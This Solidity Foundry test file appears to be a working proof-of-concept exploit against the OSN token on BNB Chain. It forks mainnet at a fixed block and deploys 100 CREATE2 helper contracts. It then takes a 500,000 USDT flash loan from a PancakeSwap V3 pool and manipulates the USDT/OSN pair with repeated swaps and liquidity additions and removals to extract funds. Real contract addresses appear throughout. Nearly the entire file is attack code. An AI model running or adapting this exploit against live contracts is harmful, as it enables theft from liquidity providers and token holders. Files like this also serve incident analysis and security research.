// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";

import "@interface/IERC20.sol";
import "@interface/IWBNB.sol";
import "@interface/IPancakeV2.sol";
import "@interface/IPancakeV3.sol";

import "./IOsn.sol";

IPancakeRouterV2 constant PancakeV2Router = IPancakeRouterV2(
    payable(0x10ED43C718714eb63d5aA57B78B54704E256024E)
);
IPancakePairV2 constant USDT_OSN_Pool = IPancakePairV2(
    0x4EEDdCc7C8714A684311F8b01154B5686A0f612f
);

IPancakePairV3 constant USDT_BTC_Pool = IPancakePairV3(
    0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4
);

IOsn constant OSN = IOsn(payable(0x810f4C6AE97BCC66DA5Ae6383CC31BD3670f6d13));
IERC20 constant USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
IERC20 constant BTC = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);

contract ExploitHack {
    address owner;
    uint256 LiqAmount;

    constructor() {
        OSN.approve(address(PancakeV2Router), type(uint256).max);
        USDT.approve(address(PancakeV2Router), type(uint256).max);
        USDT_OSN_Pool.approve(address(PancakeV2Router), type(uint256).max);

        owner = msg.sender;
    }

    function addLiquidity() public {
        (, , uint256 liquidity) = PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            100000, // uint256 amountADesired,
            100000, // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        LiqAmount = liquidity;
        // 44085 / 100000, 71049
    }

    function addLiq(uint256 liq) public {
        PancakeV2Router.removeLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            LiqAmount / 2, // uint256 liquidity,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );

        USDT_OSN_Pool.transfer(owner, liq);
    }

    function cc() public {
        PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            100000, // uint256 amountADesired,
            100000, // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        USDT.transfer(owner, USDT.balanceOf(address(this)));
    }
}

contract OsnTest is Test {
    uint256 helpContractAmount = 100;

    function setUp() public {
        vm.createSelectFork("bsc", 38474365);
        deal(address(USDT), address(this), 10 ether);
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function getBytecode() public pure returns (bytes memory bytecode) {
        bytecode = type(ExploitHack).creationCode;
    }

    function getAddress(
        bytes memory bytecode,
        uint _salt
    ) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                _salt,
                keccak256(bytecode)
            )
        );

        return address(uint160(uint(hash)));
    }

    function deploy(
        bytes memory bytecode,
        uint _salt
    ) public returns (address) {
        address addr;

        assembly {
            addr := create2(
                callvalue(),
                add(bytecode, 0x20),
                mload(bytecode),
                _salt
            )
        }

        return addr;
    }

    function testExploit() public {
        OSN.approve(address(PancakeV2Router), type(uint256).max);
        USDT.approve(address(PancakeV2Router), type(uint256).max);
        USDT_OSN_Pool.approve(address(PancakeV2Router), type(uint256).max);

        address[] memory path = new address[](2);
        path[0] = address(USDT);
        path[1] = address(OSN);

        PancakeV2Router.swapTokensForExactTokens(
            1 ether, //amountOut
            10 ether, // amountInMax
            path,
            address(this),
            block.timestamp
        );

        bytes memory bytecode = getBytecode();
        for (uint256 salt = 0; salt < helpContractAmount; salt++) {
            deploy(bytecode, salt);
            // ExploitHack helper = new ExploitHack();
            address helpAddress = getAddress(bytecode, salt);
            USDT.transfer(helpAddress, 0.001 ether);
            OSN.transfer(helpAddress, 0.001 ether);
            ExploitHack(helpAddress).addLiquidity();
        }

        // print("USDT", USDT.balanceOf(address(this)), 18);
        // print("OSN", OSN.balanceOf(address(this)), 18);

        USDT_BTC_Pool.flash(address(this), 500000 ether, 0, "");

        print("USDT balance after", USDT.balanceOf(address(this)), 18);
    }

    function pancakeV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        fee1;
        data;
        uint256 index = 0;
        while (index < 7) {
            swapTokensForExactTokens(
                address(USDT),
                address(OSN),
                10000 ether,
                USDT.balanceOf(address(this))
            );
            unchecked {
                index++;
            }
        }

        // print("USDT Balance", USDT.balanceOf(address(this)), 18);
        // print("OSN Balance", OSN.balanceOf(address(this)), 18);
        // USDT Balance: 465823.210917784153749112
        // OSN Balance: 67550.000000000000000000

        (, , uint256 liquidity) = PancakeV2Router.addLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            USDT.balanceOf(address(this)), // uint256 amountADesired,
            OSN.balanceOf(address(this)), // uint256 amountBDesired,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );
        // print("liquidity", liquidity, 18);

        bytes memory bytecode = getBytecode();
        uint256 salt = 0;
        while (salt < helpContractAmount) {
            address helpAddress = getAddress(bytecode, salt);
            USDT_OSN_Pool.transfer(
                helpAddress,
                USDT_OSN_Pool.balanceOf(address(this))
            );
            ExploitHack(helpAddress).addLiq(liquidity);

            unchecked {
                salt++;
            }
        }

        PancakeV2Router.removeLiquidity(
            address(USDT), // address tokenA,
            address(OSN), // address tokenB,
            USDT_OSN_Pool.balanceOf(address(this)), // uint256 liquidity,
            0, // uint256 amountAMin,
            0, // uint256 amountBMin,
            address(this), // address to,
            block.timestamp // uint256 deadline
        );

        index = 0;
        while (index < 10) {
            swapTokensForExactTokens(
                address(USDT),
                address(OSN),
                10000 ether,
                USDT.balanceOf(address(this))
            );
            swapExactTokensForTokensSupportingFeeOnTransferTokens(
                address(OSN),
                address(USDT),
                OSN.balanceOf(address(this))
            );
            unchecked {
                index++;
            }
        }

        // OSN -> 0
        salt = 0;
        while (salt < helpContractAmount) {
            address helpAddress = getAddress(bytecode, salt);
            ExploitHack(helpAddress).cc();

            unchecked {
                salt++;
            }
        }

        // deal(address(USDT), address(this), 500000 ether + fee0);
        USDT.transfer(address(USDT_BTC_Pool), 500000 ether + fee0);
    }

    function swapTokensForExactTokens(
        address tokenA,
        address tokenB,
        uint256 amountout,
        uint256 amountInMax
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        PancakeV2Router.swapTokensForExactTokens(
            amountout,
            amountInMax,
            path,
            address(this),
            block.timestamp
        );
    }

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        address tokenA,
        address tokenB,
        uint256 amount
    ) internal {
        address[] memory path = new address[](2);
        path[0] = address(tokenA);
        path[1] = address(tokenB);
        PancakeV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}
